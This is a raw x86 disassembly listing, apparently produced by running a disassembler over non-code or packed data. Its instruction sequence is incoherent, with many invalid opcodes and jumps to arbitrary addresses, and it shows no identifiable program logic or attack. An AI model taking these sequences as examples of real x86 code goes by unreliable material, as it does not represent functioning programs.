  421f95:	addr16 mov bh,0x12
  421f98:	out    0x34,eax
  421f9a:	xchg   ebx,eax
  421f9b:	dec    ebx
  421f9c:	rsqrtps xmm5,XMMWORD PTR [ecx]
  421f9f:	cmp    DWORD PTR [eax+eiz*8-0x72be20c4],esi
  421fa6:	(bad)  [esi+0x7c]
  421fa9:	retf   
  421faa:	or     eax,0x8089495c
  421faf:	or     edi,DWORD PTR [edx]
  421fb1:	jmp    0x9dde067b
  421fb6:	add    al,0xfb
  421fb8:	jge    0x42202e
  421fba:	dec    edi
  421fbb:	outs   dx,DWORD PTR ds:[esi]
  421fbc:	dec    edx
  421fbd:	fstp   DWORD PTR [esi+0x19]
  421fc0:	stos   DWORD PTR es:[edi],eax
  421fc1:	or     BYTE PTR [edi-0x49],dh
  421fc4:	and    al,0x1b
  421fc6:	int3   
  421fc7:	mov    ebx,fs
  421fc9:	dec    eax
  421fca:	mov    cs:0x8aef39bd,eax
  421fd0:	mov    bl,0xb3
  421fd2:	cmp    bh,bl
  421fd4:	xchg   edi,eax
  421fd5:	mov    ch,0x17
  421fd7:	popf   
  421fd8:	jns    0x422047
  421fda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421fdb:	mov    edi,0x5c713ec3
  421fe0:	ror    BYTE PTR [eax+0x7a],cl
  421fe3:	jo     0x421fb8
  421fe5:	dec    ch
  421fe7:	mov    dl,0xbd
  421fe9:	test   ah,al
  421feb:	addr16 addr16 call 0xd0a1:0x1532f040
  421ff4:	or     eax,0x8c817f7b
  421ff9:	mov    esi,0xde67f73b
  421ffe:	js     0x42201a
  422000:	nop
  422001:	jg     0x421fe7
  422003:	std    
  422004:	jg     0x422006
	...
  42200e:	add    BYTE PTR [eax],al
  422010:	add    BYTE PTR [edx+0x4f],al
  422013:	nop
  422014:	int3   
  422015:	popf   
  422016:	fistp  WORD PTR [esi-0x31]
  422019:	lea    ecx,[ebx]
  42201b:	jmp    0xabf8de76
  422020:	dec    ebx
  422021:	cmp    eax,0xac000199
  422026:	add    eax,DWORD PTR [eax]
  422028:	add    BYTE PTR [esi-0x6e],bl
  42202b:	xchg   DWORD PTR [ebx-0x712df6a6],edi
  422031:	jbe    0x422002
  422033:	or     al,0x1
  422035:	adc    esi,esp
  422037:	stos   BYTE PTR es:[edi],al
  422038:	jae    0x421fc4
  42203a:	mov    ds:0xa6822229,al
  42203f:	push   cs
  422040:	pop    edx
  422041:	adc    BYTE PTR ds:0xf56eea61,cl
  422047:	jnp    0x422024
  422049:	push   eax
  42204a:	inc    ecx
  42204b:	mov    ebp,0x8ca748c4
  422050:	mov    cl,0x9c
  422052:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422053:	inc    ebx
  422054:	hlt    
  422055:	mov    dl,0x96
  422057:	pop    esp
  422059:	mov    dh,0x85
  42205b:	mov    ah,0x0
  42205d:	jle    0x422077
  42205f:	dec    ebp
  422060:	sahf   
  422061:	jmp    0x42204f
  422063:	xchg   esi,eax
  422064:	cwde   
  422065:	dec    edi
  422066:	add    ah,BYTE PTR [eax]
  422068:	xor    al,0xd6
  42206a:	pop    ebx
  42206b:	push   ebx
  42206c:	sub    al,0x6f
  42206e:	or     BYTE PTR [edi+0x15],dh
  422071:	add    al,BYTE PTR [eax+0x22]
  422074:	adc    ch,bh
  422076:	out    dx,eax
  422077:	mov    ecx,esi
  422079:	jle    0x422017
  42207b:	cmp    cl,BYTE PTR ds:0x98895ba4
  422081:	scas   eax,DWORD PTR es:[edi]
  422082:	cmp    eax,0xc2ee020
  422087:	ss jb  0x4220f0
  42208a:	xor    dl,BYTE PTR [edx-0x42f4ab99]
  422090:	mov    ch,0x43
  422092:	mov    ah,0x43
  422094:	sbb    DWORD PTR [ebx+0x4],esi
  422097:	stos   BYTE PTR es:[edi],al
  422098:	ror    BYTE PTR [edi-0x49ba40a3],1
  42209e:	(bad)  
  42209f:	fcomp  QWORD PTR [ecx-0x51]
  4220a2:	pop    ss
  4220a3:	loope  0x4220b3
  4220a5:	call   0x8182:0xbe830ddf
  4220ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4220ad:	xor    al,0xa1
  4220af:	fisttp DWORD PTR [edx]
  4220b1:	loope  0x422079
  4220b3:	inc    ebp
  4220b4:	or     eax,0xd1f47365
  4220b9:	pusha  
  4220ba:	in     eax,0x31
  4220bc:	mov    bl,0xf3
  4220be:	mov    BYTE PTR [ebp+0x6adcc4bd],0xda
  4220c5:	mov    ah,0x42
  4220c7:	repz cmp eax,0x28818c72
  4220cd:	leave  
  4220ce:	jecxz  0x4220f5
  4220d0:	(bad)  
  4220d1:	mov    edi,0x67170126
  4220d6:	xchg   edx,eax
  4220d7:	shr    BYTE PTR [esi-0x13],cl
  4220da:	or     DWORD PTR [eax+0x5733b456],ebp
  4220e0:	dec    edx
  4220e1:	mov    ebx,0x5507bed5
  4220e6:	dec    ecx
  4220e7:	repz repz (bad) 
  4220ea:	jmp    0x7e6dcb97
  4220ef:	popa   
  4220f0:	pandn  mm5,QWORD PTR [eax+0x1c]
  4220f4:	or     ebx,ebx
  4220f6:	add    DWORD PTR [eax+0x5],0x69
  4220fa:	cmp    ah,BYTE PTR [ecx+0x2368f6e6]
  422100:	and    DWORD PTR [edi+0x51de0276],edi
  422106:	inc    ebx
  422107:	aas    
  422108:	js     0x422185
  42210a:	ja     0x422140
  42210c:	ret    0x692e
  42210f:	jb     0x4220df
  422111:	cmp    dh,BYTE PTR [eax-0x4ae5b5a0]
  422117:	jns    0x4220a4
  422119:	xchg   ebx,eax
  42211a:	xchg   ebx,eax
  42211b:	fmul   DWORD PTR [ecx-0x403aa1ab]
  422121:	mov    edx,0x568faf83
  422126:	mov    eax,ds:0x7c112812
  42212b:	shl    al,0xb3
  42212e:	adc    DWORD PTR [edx],esi
  422130:	(bad)  
  422131:	sub    ch,BYTE PTR [ecx+0x5b]
  422134:	aad    0xeb
  422136:	mov    esp,0xe52c4062
  42213b:	scas   al,BYTE PTR es:[edi]
  42213c:	imul   eax,DWORD PTR [esi],0xe2991273
  422142:	add    DWORD PTR [edx+0x1301c374],edx
  422148:	rcr    edx,cl
  42214a:	xchg   esi,eax
  42214b:	sbb    BYTE PTR [esi],ch
  42214d:	sbb    eax,0x5086dd0d
  422152:	in     eax,0x6
  422154:	loop   0x422193
  422156:	add    edx,DWORD PTR [ecx]
  422158:	test   ebx,ecx
  42215a:	push   ecx
  42215b:	mov    BYTE PTR [ebx],ch
  42215d:	mov    al,0xa4
  42215f:	inc    ecx
  422160:	sbb    esi,DWORD PTR [ebx+ebp*2]
  422163:	clc    
  422164:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422165:	(bad)  
  422166:	or     ah,BYTE PTR [ecx-0x4e719a13]
  42216c:	sub    eax,0xcfd54f9a
  422171:	mov    cl,BYTE PTR [esi+0x3403b5e5]
  422177:	pop    esi
  422178:	pop    esi
  422179:	xchg   BYTE PTR [edx-0x32591572],ch
  42217f:	cs inc esp
  422181:	leave  
  422182:	inc    esp
  422183:	xlat   BYTE PTR ds:[ebx]
  422184:	ffreep st(2)
  422186:	mov    edi,0xa8ce7198
  42218b:	push   ecx
  42218c:	mov    al,0x56
  42218e:	cli    
  42218f:	xchg   bh,dl
  422191:	sub    dl,BYTE PTR [ecx-0x5e]
  422194:	mov    WORD PTR [edx+ecx*2+0x420acfcb],ss
  42219b:	sbb    eax,0xae20c558
  4221a0:	loop   0x4221f9
  4221a2:	push   esi
  4221a3:	dec    ebp
  4221a4:	sbb    al,0xa7
  4221a6:	lea    ebx,[edx-0x6160a65a]
  4221ac:	push   cs
  4221ad:	add    ebx,DWORD PTR [ebx+0xcb8680b]
  4221b3:	(bad)  
  4221b4:	leave  
  4221b5:	adc    ebx,DWORD PTR [eax+0x6a53d6d7]
  4221bb:	push   eax
  4221bc:	sbb    al,0x1c
  4221be:	mov    dl,0xe6
  4221c0:	retf   
  4221c1:	fadd   DWORD PTR [edi]
  4221c3:	add    eax,0x371de1cc
  4221c8:	mov    ds:0x3acbe0b0,eax
  4221cd:	sbb    ebx,DWORD PTR [esi+edi*1]
  4221d0:	je     0x42224a
  4221d2:	retf   0x389a
  4221d5:	fisubr DWORD PTR [esi]
  4221d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4221d8:	pop    esi
  4221d9:	inc    esp
  4221da:	retf   
  4221db:	pop    edi
  4221dc:	mov    ds:0xaea7e42c,eax
  4221e1:	mov    ebp,0xe4691e41
  4221e6:	sub    BYTE PTR [ecx+ecx*4+0x4a],0xba
  4221eb:	jg     0x422259
  4221ed:	lahf   
  4221ee:	push   esp
  4221ef:	cli    
  4221f0:	aaa    
  4221f1:	add    BYTE PTR [eax],bh
  4221f3:	xlat   BYTE PTR ds:[ebx]
  4221f4:	mov    edi,0xcc211976
  4221f9:	push   edx
  4221fa:	out    dx,eax
  4221fb:	cmc    
  4221fc:	xchg   edi,eax
  4221fd:	dec    eax
  4221fe:	test   al,0x3a
  422200:	fs pop ss
  422202:	popa   
  422203:	cmc    
  422204:	push   ds
  422205:	xchg   esp,eax
  422206:	stos   BYTE PTR es:[edi],al
  422207:	mov    ss,WORD PTR [esi-0x12]
  42220a:	shl    BYTE PTR [eax+0xb],cl
  42220d:	push   cs
  42220e:	fisttp WORD PTR [ecx+0x408dae3c]
  422214:	pop    edx
  422215:	inc    DWORD PTR [esi+0x1c]
  422218:	aaa    
  422219:	and    eax,DWORD PTR [esi+edx*8+0x4e]
  42221d:	jne    0x422263
  42221f:	enter  0xee61,0x35
  422223:	shl    esi,cl
  422225:	sbb    eax,0x63612b88
  42222a:	dec    edx
  42222b:	rol    DWORD PTR [ecx+0x41],0x2e
  42222f:	loopne 0x422278
  422231:	jecxz  0x42220a
  422233:	push   edx
  422234:	out    dx,al
  422235:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422236:	mov    dl,0xbc
  422238:	xor    dl,BYTE PTR [ecx]
  42223a:	aaa    
  42223b:	nop
  42223c:	clc    
  42223d:	cld    
  42223e:	shl    DWORD PTR [edi],0x29
  422241:	mov    ds:0x42872690,al
  422246:	mov    al,cl
  422248:	mov    ch,0xd9
  42224a:	aas    
  42224b:	scas   eax,DWORD PTR es:[edi]
  42224c:	cld    
  42224d:	jmp    0xf8ce:0x45159c1d
  422254:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422255:	sbb    dl,BYTE PTR [ecx]
  422257:	ins    BYTE PTR es:[edi],dx
  422258:	push   eax
  422259:	or     edi,DWORD PTR [eax]
  42225b:	mov    ds:0x67fecde0,eax
  422260:	repnz mov edi,0x4e822ace
  422266:	or     al,BYTE PTR [edi]
  422268:	push   es
  422269:	nop
  42226a:	sub    BYTE PTR [esi+0x630ececc],cl
  422270:	xchg   esi,eax
  422271:	dec    edi
  422272:	dec    esp
  422273:	add    al,0x69
  422275:	cmp    eax,0x295b7e2e
  42227a:	cmp    DWORD PTR ds:[ebx-0x18183d3e],esi
  422281:	inc    ebx
  422282:	cmp    ah,al
  422284:	pop    edi
  422285:	mov    WORD PTR [eax],?
  422287:	mov    eax,ds:0xcdc47ff4
  42228c:	icebp  
  42228d:	add    al,ah
  42228f:	xchg   ebx,eax
  422290:	push   ecx
  422291:	cmp    DWORD PTR [ecx+0x3a],edi
  422294:	cmp    esp,DWORD PTR [eax-0x61d4e699]
  42229a:	jbe    0x4222f5
  42229c:	mul    DWORD PTR [ebx+0x68fbca62]
  4222a2:	pop    edx
  4222a3:	fs xor eax,0x1be0d9cc
  4222a9:	jae    0x4222f5
  4222ab:	sbb    eax,0x632a85a0
  4222b0:	mov    esp,0xdff2fea9
  4222b5:	mov    ds:0x4d3ccb2b,al
  4222ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4222bb:	jo     0x42232e
  4222bd:	push   es
  4222be:	add    eax,DWORD PTR [ebx-0x18]
  4222c1:	dec    ebp
  4222c2:	push   0x9eadff76
  4222c7:	mov    dh,0x89
  4222c9:	retf   0xf8f1
  4222cc:	sub    DWORD PTR [ebx+0x67],ebx
  4222cf:	and    al,0xed
  4222d1:	xor    eax,0xa4cc9c3b
  4222d6:	push   cs
  4222d7:	ins    DWORD PTR es:[edi],dx
  4222d8:	pop    ecx
  4222d9:	xchg   ecx,eax
  4222da:	push   es
  4222db:	lods   al,BYTE PTR ds:[esi]
  4222dc:	xchg   ecx,eax
  4222dd:	rol    bl,0xcc
  4222e0:	out    dx,eax
  4222e1:	int3   
  4222e2:	lds    esi,FWORD PTR [ecx+0x62]
  4222e5:	cwde   
  4222e6:	les    ebx,FWORD PTR [ecx-0x6e]
  4222e9:	retf   
  4222ea:	test   esi,edi
  4222ec:	shl    BYTE PTR [esi-0x24],cl
  4222ef:	mov    ds:0x7f764856,eax
  4222f4:	dec    edx
  4222f5:	test   eax,0x629b8c4c
  4222fa:	xor    BYTE PTR ds:0xdb6fe779,cl
  422300:	jmp    0x76dd675f
  422305:	(bad)  
  422306:	cmp    BYTE PTR [edi],bh
  422308:	inc    edi
  422309:	jbe    0x42229f
  42230b:	ret    
  42230c:	jno    0x422371
  42230e:	dec    ebx
  42230f:	cmc    
  422310:	pop    eax
  422311:	xchg   BYTE PTR [ebx+0x66],bl
  422314:	sbb    BYTE PTR [ebx-0x67],ah
  422317:	xchg   ebp,eax
  422318:	pushf  
  422319:	push   ds
  42231a:	add    bl,BYTE PTR ds:0x5ac50ef4
  422320:	pop    esp
  422321:	call   0x325c:0x94be8ec
  422328:	pop    ebx
  422329:	jl     0x4222cc
  42232b:	ret    0xf83c
  42232e:	dec    esp
  42232f:	lds    esp,FWORD PTR [edi]
  422331:	jb     0x422364
  422333:	cmp    ch,BYTE PTR [esp+eiz*2+0x53]
  422337:	push   ds
  422338:	jo     0x42232d
  42233a:	rcr    BYTE PTR [esi+edi*4],0xb2
  42233e:	pop    esp
  42233f:	xchg   edi,eax
  422340:	test   DWORD PTR [ecx+0x6e645af6],ebp
  422346:	cmc    
  422347:	fild   DWORD PTR [ebx+ebp*8+0x2bb6aafd]
  42234e:	inc    ebx
  42234f:	and    ah,BYTE PTR [edi]
  422351:	fcmove st,st(7)
  422353:	push   ecx
  422354:	pop    ecx
  422355:	jb     0x4223b2
  422357:	hlt    
  422358:	cmp    bh,bl
  42235a:	or     dh,BYTE PTR [ebp+0x52]
  42235d:	cmp    eax,0xb13fbdea
  422362:	pop    edi
  422363:	jmp    0xc62c3ca8
  422368:	in     al,0xb9
  42236a:	mov    dh,0x88
  42236c:	pop    ebx
  42236d:	sub    cl,BYTE PTR [ecx]
  42236f:	pop    edi
  422370:	jmp    0x69ed28b7
  422375:	lea    edx,[edi]
  422377:	mov    WORD PTR [edi+0x8],?
  42237a:	lock xor bl,ch
  42237d:	loopne 0x422342
  42237f:	lds    ebp,FWORD PTR [esp+eax*1+0x2f]
  422383:	add    al,0x4d
  422385:	xchg   ebx,esi
  422387:	mov    al,0xea
  422389:	not    DWORD PTR [edi+edx*4+0x595d927a]
  422390:	inc    ecx
  422391:	or     ah,BYTE PTR ds:0xf542987e
  422397:	arpl   WORD PTR [ebx],bp
  422399:	pusha  
  42239a:	outs   dx,BYTE PTR ds:[esi]
  42239b:	or     ch,BYTE PTR [esi+ebp*2]
  42239e:	out    dx,al
  42239f:	cmp    BYTE PTR [ecx],bh
  4223a1:	fcomp  DWORD PTR [edi+0x1700c070]
  4223a7:	add    DWORD PTR [ebp-0x35],esi
  4223aa:	adc    eax,0xd828d37f
  4223af:	sahf   
  4223b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4223b1:	add    BYTE PTR [esi+0x40],al
  4223b4:	clc    
  4223b5:	mov    ch,0xb2
  4223b7:	cmp    eax,0xfe804b75
  4223bc:	fisttp QWORD PTR [eax+ebp*1]
  4223bf:	adc    bh,dh
  4223c1:	daa    
  4223c2:	pop    edi
  4223c3:	test   al,0x1b
  4223c5:	aam    0xec
  4223c7:	aam    0x2e
  4223c9:	adc    ah,BYTE PTR [ebx+ebp*4]
  4223cc:	fild   WORD PTR [di-0x73]
  4223d0:	add    esp,DWORD PTR [esi-0x4f]
  4223d3:	call   0x4223e0
	...
  4223e0:	add    BYTE PTR [esi+0x7c],ah
  4223e3:	loopne 0x4223a0
  4223e5:	cli    
  4223e6:	mov    edi,0xa15cfd7f
  4223eb:	pop    esp
  4223ec:	dec    edi
  4223ed:	test   BYTE PTR [eax],dh
  4223ef:	scas   eax,DWORD PTR es:[edi]
  4223f0:	and    eax,0x19ce9
  4223f5:	lods   al,BYTE PTR ds:[esi]
  4223f6:	add    eax,DWORD PTR [eax]
  4223f8:	add    ah,dl
  4223fa:	in     eax,0xd8
  4223fc:	sbb    DWORD PTR [edx-0x50],0xffffff82
  422400:	push   ss
  422401:	adc    bh,ch
  422403:	les    edi,FWORD PTR [eax]
  422405:	adc    al,0x9c
  422407:	dec    esp
  422408:	pinsrw mm2,WORD PTR [edi],0x76
  42240c:	add    DWORD PTR [ecx-0x415f13ed],esp
  422412:	or     BYTE PTR [esi+0x41],bh
  422415:	loop   0x4223cd
  422417:	jnp    0x42240b
  422419:	cmp    DWORD PTR [edi+ebp*2-0x41],eax
  42241d:	retf   0xde93
  422420:	loope  0x4223f6
  422422:	and    BYTE PTR [edi-0x35],dh
  422425:	xor    al,0x4b
  422427:	pop    edi
  422428:	pop    ebp
  422429:	or     dh,BYTE PTR ds:[ebp+ebp*4-0x7cec439d]
  422431:	push   ds
  422432:	fs nop
  422434:	jge    0x422460
  422436:	mov    ch,0x52
  422438:	or     ebx,DWORD PTR [ebx+0x1bd2cb39]
  42243e:	(bad)  
  42243f:	jge    0x422441
  422441:	mov    esp,0xad16c701
  422446:	test   ebp,ebp
  422448:	(bad)  
  422449:	je     0x422462
  42244b:	shl    BYTE PTR [ebx+0x77],cl
  42244e:	out    dx,al
  42244f:	xor    al,BYTE PTR [edx-0x2c]
  422452:	loope  0x422486
  422454:	call   0xd74f:0x4a675a44
  42245b:	fwait
  42245c:	and    DWORD PTR [edx-0x7e],ebp
  42245f:	jp     0x4223fb
  422461:	mov    ebp,0xb4113c2d
  422466:	outs   dx,BYTE PTR ds:[esi]
  422467:	push   0x14b990a2
  42246c:	loop   0x4224e4
  42246e:	mov    ecx,0xa58ba2d2
  422473:	ins    BYTE PTR es:[edi],dx
  422474:	imul   ebx,DWORD PTR [eax-0x486f203d],0xffffff81
  42247b:	pop    DWORD PTR [ebx-0x68]
  42247e:	push   edi
  42247f:	loope  0x42249d
  422481:	pop    eax
  422482:	jne    0x4224ee
  422484:	push   0x972060b9
  422489:	adc    dl,0xb
  42248c:	mov    dh,BYTE PTR [ecx+0x14549514]
  422492:	dec    edx
  422493:	sbb    al,0x1e
  422495:	out    dx,al
  422496:	ja     0x422453
  422498:	xchg   edi,eax
  422499:	je     0x4224f1
  42249b:	push   cs
  42249c:	les    edx,FWORD PTR [ebx-0x637edd46]
  4224a2:	push   ss
  4224a3:	test   edx,edx
  4224a5:	dec    edi
  4224a6:	int    0xa3
  4224a8:	mov    ebp,0x19757292
  4224ad:	shl    dh,1
  4224af:	jge    0x4224ec
  4224b1:	int    0x2b
  4224b3:	push   ds
  4224b4:	stc    
  4224b5:	int    0x38
  4224b7:	inc    esp
  4224b8:	lahf   
  4224b9:	jmp    0xde8e3260
  4224be:	jmp    0x2bc6:0x4437bfb4
  4224c5:	cmp    DWORD PTR [edx-0xc4375e5],ecx
  4224cb:	mov    al,0x82
  4224cd:	std    
  4224ce:	sbb    BYTE PTR ds:[ebx-0x7152c271],bh
  4224d5:	jae    0x42253e
  4224d7:	pop    ecx
  4224d8:	and    BYTE PTR [esi+0x1a2f1225],0x1
  4224df:	xor    al,0xc3
  4224e1:	mov    esp,0xdd4dd4d1
  4224e6:	pop    ebx
  4224e7:	sub    esi,DWORD PTR [esi+0x759f20eb]
  4224ed:	sahf   
  4224ee:	je     0x42256b
  4224f0:	jbe    0x4224d8
  4224f2:	retf   
  4224f3:	int3   
  4224f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4224f5:	jo     0x4224c1
  4224f7:	adc    al,0x12
  4224f9:	adc    cl,BYTE PTR [eax]
  4224fb:	push   cs
  4224fc:	retf   
  4224fd:	mov    eax,0x8103324e
  422502:	mov    al,0x4e
  422504:	stos   DWORD PTR es:[edi],eax
  422505:	pop    ecx
  422506:	scas   eax,DWORD PTR es:[edi]
  422507:	stos   BYTE PTR es:[edi],al
  422508:	ret    
  422509:	dec    esi
  42250a:	call   0x999:0x458bd35b
  422511:	fwait
  422512:	call   0x6cde:0x14e8fd1e
  422519:	retf   
  42251a:	mov    bl,BYTE PTR [eax-0x2a]
  42251d:	(bad)  
  42251e:	neg    BYTE PTR [ebp+0x6bbce0f2]
  422524:	jg     0x422576
  422526:	sbb    DWORD PTR [eax-0x34],eax
  422529:	xchg   edx,eax
  42252a:	call   0x8a68ef2e
  42252f:	pop    es
  422530:	shl    DWORD PTR [eax-0x3e39c70e],cl
  422536:	push   0xffffffcd
  422538:	push   0x55
  42253a:	pop    ss
  42253b:	pop    ebp
  42253c:	clc    
  42253d:	adc    eax,0x7ac37c60
  422542:	stc    
  422543:	inc    ecx
  422544:	mov    esi,0x9404050
  422549:	popf   
  42254a:	call   0xcf8d5d85
  42254f:	sub    al,ch
  422551:	pop    esi
  422552:	mov    bl,0xa7
  422554:	sbb    DWORD PTR [ecx+0x43805581],esp
  42255a:	jbe    0x42254e
  42255c:	xchg   ecx,eax
  42255d:	inc    esp
  42255e:	stos   BYTE PTR es:[edi],al
  42255f:	aaa    
  422560:	inc    BYTE PTR [esi-0x62029395]
  422566:	dec    ebx
  422567:	adc    ch,BYTE PTR [ebp-0x26]
  42256a:	cwde   
  42256b:	mov    ds:0x20aa1e3e,al
  422570:	add    dh,BYTE PTR [edx-0x3f]
  422573:	add    eax,0xbe328616
  422578:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422579:	mov    cl,0xa6
  42257b:	data16 sbb bl,al
  42257e:	retf   
  42257f:	imul   ecx,edx,0x79e2b778
  422585:	pop    es
  422586:	fstp   QWORD PTR es:[edx-0x3f]
  42258a:	fmul   QWORD PTR [eax-0x9]
  42258d:	ret    
  42258e:	loop   0x42254f
  422590:	mov    cs,WORD PTR [ecx]
  422592:	mov    ds:0xc49212ad,al
  422597:	xchg   ebx,eax
  422598:	inc    ecx
  422599:	adc    DWORD PTR [ebx+eiz*1+0x587bfea7],ebp
  4225a0:	loop   0x4225bb
  4225a2:	mov    ecx,DWORD PTR [ebp-0x5ff142fb]
  4225a8:	(bad)
  4225ac:	sti    
  4225ad:	bound  esi,QWORD PTR [edx+0x372193e2]
  4225b3:	ins    BYTE PTR es:[edi],dx
  4225b4:	pop    eax
  4225b5:	mov    dh,0xea
  4225b7:	adc    DWORD PTR [ecx-0x420fc345],ecx
  4225bd:	fstp   QWORD PTR [ebp+0x4e]
  4225c0:	(bad)  
  4225c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4225c2:	push   0xffffffcc
  4225c4:	mov    ds:0x7f76e956,al
  4225c9:	sub    al,0xba
  4225cb:	fsubp  st(2),st
  4225cd:	sub    eax,0x6406ff66
  4225d2:	loope  0x422613
  4225d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225d5:	daa    
  4225d6:	hlt    
  4225d7:	jb     0x422562
  4225d9:	outs   dx,DWORD PTR ds:[esi]
  4225da:	mov    eax,0xc2edfcb
  4225df:	call   0x16c746f7
  4225e4:	mov    bl,0x17
  4225e6:	sbb    al,0x87
  4225e8:	xchg   edi,eax
  4225e9:	std    
  4225ea:	adc    edx,esp
  4225ec:	jg     0x4225b5
  4225ee:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225f0:	pushf  
  4225f1:	xchg   ebx,eax
  4225f2:	into   
  4225f3:	in     eax,0x2b
  4225f5:	inc    BYTE PTR [esp+ecx*8-0x8]
  4225f9:	xor    DWORD PTR [esi+0x1f760d24],esi
  4225ff:	test   al,0xa
  422601:	daa    
  422602:	test   eax,0x5dadcfa2
  422607:	and    eax,0x9b31bd31
  42260c:	(bad)  
  42260d:	in     eax,dx
  42260e:	loop   0x422650
  422610:	sub    ebp,ecx
  422612:	or     ah,ch
  422614:	mov    eax,0x8d931c5a
  422619:	lahf   
  42261a:	addr16 pop ebp
  42261c:	xor    bl,cl
  42261e:	sub    DWORD PTR [esi+0x50],ecx
  422621:	mov    eax,0x467de4ae
  422626:	jae    0x422614
  422628:	add    DWORD PTR fs:[esp+edx*2],esp
  42262c:	imul   DWORD PTR [ebx]
  42262e:	and    ebx,edi
  422630:	(bad)  
  422631:	pop    es
  422632:	mov    ah,BYTE PTR [eax-0x6bbc91b0]
  422638:	pop    edi
  422639:	(bad)  
  42263a:	jae    0x4226b2
  42263c:	pop    ebp
  42263d:	xchg   ecx,eax
  42263e:	and    BYTE PTR [esi-0x5130bd02],al
  422644:	xchg   ebp,eax
  422645:	inc    esi
  422646:	xchg   ecx,eax
  422647:	cmp    ebx,DWORD PTR ss:[ebx]
  42264a:	out    0x83,eax
  42264c:	push   ds
  42264d:	add    bl,BYTE PTR [esi+ebp*1]
  422650:	and    DWORD PTR [ebx],0x49e3167d
  422656:	and    eax,0x1b882f95
  42265b:	scas   al,BYTE PTR es:[edi]
  42265c:	dec    esi
  42265d:	bnd jo 0x4226d8
  422660:	jl     0x422631
  422662:	xor    al,0xbd
  422664:	or     dl,BYTE PTR [ebx]
  422666:	cli    
  422667:	sub    esp,ecx
  422669:	lds    eax,FWORD PTR [ecx+0x6dc82503]
  42266f:	and    DWORD PTR [edi],edi
  422671:	jmp    0xc46b:0x98a5cd08
  422678:	mov    edx,0x12652381
  42267d:	jbe    0x422680
  42267f:	mov    edx,0xaee337db
  422684:	pushf  
  422685:	out    dx,eax
  422686:	(bad)  
  422687:	and    eax,DWORD PTR [esi]
  422689:	push   ebx
  42268a:	(bad)  
  42268b:	mov    ebx,0xa87a0350
  422690:	adc    al,BYTE PTR ds:0x82b9e5de
  422696:	or     dl,dh
  422698:	pop    edx
  422699:	jmp    0x2a2bee42
  42269e:	sbb    BYTE PTR [ebx+0x36aabfa],dl
  4226a4:	mov    dh,0x7d
  4226a6:	inc    edx
  4226a7:	leave  
  4226a8:	shl    cl,0x35
  4226ab:	push   esp
  4226ac:	inc    esp
  4226ad:	pop    ss
  4226ae:	and    bh,BYTE PTR [edi-0x215d2eab]
  4226b4:	add    esi,DWORD PTR [ebp+0x76af039]
  4226ba:	arpl   WORD PTR [ebx],bp
  4226bc:	adc    al,0xb
  4226be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4226bf:	dec    ebx
  4226c0:	rcr    ch,cl
  4226c2:	pop    edi
  4226c3:	rcr    DWORD PTR [edx+0x308b0029],0xf
  4226ca:	cmc    
  4226cb:	xchg   edi,eax
  4226cc:	not    DWORD PTR [esp+ebx*8-0x5b]
  4226d0:	mov    cl,0xbf
  4226d2:	pop    ss
  4226d3:	and    al,0xb
  4226d5:	(bad)  
  4226d6:	or     bl,BYTE PTR [edx-0x3c318dcb]
  4226dc:	imul   esi,DWORD PTR [esp+esi*4+0x5c],0xb1db04e4
  4226e4:	jmp    0x422734
  4226e6:	int3   
  4226e7:	rcl    BYTE PTR [esi-0x27],0x5f
  4226eb:	adc    al,0xe2
  4226ed:	out    0x83,eax
  4226ef:	adc    BYTE PTR [ecx+0x7e],0x1d
  4226f3:	into   
  4226f4:	ins    BYTE PTR es:[edi],dx
  4226f5:	push   ds
  4226f6:	test   DWORD PTR [ebp+0x0],edi
  4226f9:	jge    0x42272a
  4226fb:	into   
  4226fc:	loopne 0x4226fc
  4226fe:	les    ebx,FWORD PTR [edx]
  422700:	mov    DWORD PTR [esi+0x6f],ecx
  422703:	xchg   ebp,eax
  422704:	das    
  422705:	mov    edi,0x3e80cc54
  42270a:	pusha  
  42270b:	inc    esp
  42270c:	inc    ebp
  42270d:	cmp    eax,0xff3a938c
  422712:	push   0x862e2093
  422717:	pop    esi
  422718:	stos   BYTE PTR es:[edi],al
  422719:	adc    al,0xe7
  42271b:	mov    ds:0xa130c867,al
  422720:	adc    al,0x90
  422722:	sub    DWORD PTR [eax],edx
  422724:	(bad)  
  422725:	es lahf 
  422727:	icebp  
  422728:	pop    esi
  422729:	adc    BYTE PTR [ebp+0x2d],0x6a
  42272d:	loop   0x4226ee
  42272f:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422731:	push   ebx
  422732:	int3   
  422733:	inc    ecx
  422734:	dec    ecx
  422735:	rol    BYTE PTR [eax+ebp*4],1
  422738:	out    dx,eax
  422739:	mov    ebx,0xe2fbfc5f
  42273e:	pop    ss
  42273f:	neg    BYTE PTR [ecx-0x7a6ee3a4]
  422745:	xor    al,0x10
  422747:	push   cs
  422748:	fadd   QWORD PTR [eax]
  42274a:	fdivr  DWORD PTR [edi+esi*8+0x2615b85e]
  422751:	pop    eax
  422752:	dec    edx
  422753:	dec    eax
  422754:	push   0x588cda0f
  422759:	jmp    0x3e48:0x89f36708
  422760:	pop    edx
  422761:	aad    0x87
  422763:	cdq    
  422764:	mov    eax,ds:0x7c4cd36d
  422769:	xchg   BYTE PTR [esi],ch
  42276b:	test   DWORD PTR [edi+0x7a1eb067],ebx
  422771:	pop    eax
  422772:	adc    ebp,DWORD PTR [edx+0x21b93e92]
  422778:	mov    ebp,0x3e0f5c39
  42277d:	fs dec eax
  42277f:	pop    esp
  422780:	fucom  st(5)
  422782:	(bad)  
  422783:	dec    ebx
  422784:	add    DWORD PTR [eax],esp
  422786:	or     ebp,edi
  422788:	fwait
  422789:	xchg   edi,eax
